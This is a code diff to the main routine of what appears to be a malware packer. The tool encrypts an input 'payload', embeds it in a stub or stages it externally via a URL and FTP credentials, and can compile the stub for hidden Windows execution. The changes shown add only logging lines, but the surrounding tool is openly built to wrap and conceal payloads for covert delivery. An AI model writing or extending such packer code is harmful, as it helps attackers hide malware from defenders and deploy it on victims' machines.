@@ -106,8 +106,13 @@ def main():
     parser.add_argument("--hide", action="store_true", help="Compile stub with -mwindows for hidden execution")
     args = parser.parse_args()
 
+    print(f"[+] Loading input file: {args.input}")
     with open(args.input, "rb") as f:
         data = f.read()
+
+    print(f"[+] Input size: {len(data)} bytes")
+    print(f"[+] Using encryption: {args.encrypt.upper()}")
+    print(f"[+] Payload type: {args.type}")
 
     if args.encrypt == "xor":
         encrypted = xor_encrypt(data, args.key)
@@ -118,13 +123,20 @@ def main():
         bin_output = args.bin if args.bin else "payload.bin"
         with open(bin_output, "wb") as f:
             f.write(encrypted)
-        print(f"[+] External encrypted payload written to {bin_output}")
+            print(f"[+] Writing encrypted payload to external file: {bin_output}")
+            print(f"[+] Staging details:")
+            print(f"    URL: {args.url}")
+            print(f"    FTP user: {args.ftp_user}")
         generate_stub(encrypted, args.key, args.encrypt, args.type, url=args.url, embed_payload=False, ftp_user=args.ftp_user, ftp_pass=args.ftp_pass)
     else:
+        print("[+] Embedding payload directly into stub")
         generate_stub(encrypted, args.key, args.encrypt, args.type, embed_payload=True, ftp_user=args.ftp_user, ftp_pass=args.ftp_pass)
 
+    print(f"[+] Preparing to compile stub: {args.output}")
+    compile_mode = "Hidden (-mwindows)" if args.hide else "Console (-mconsole)"
+    print(f"    Compile mode: {compile_mode}")
     compile_stub(args.output, hide=args.hide)
-    print(f"[+] Packed stub compiled to {args.output}")
+    print(f"[✓] Packing complete: {args.output}")
 
 if __name__ == "__main__":
     main()
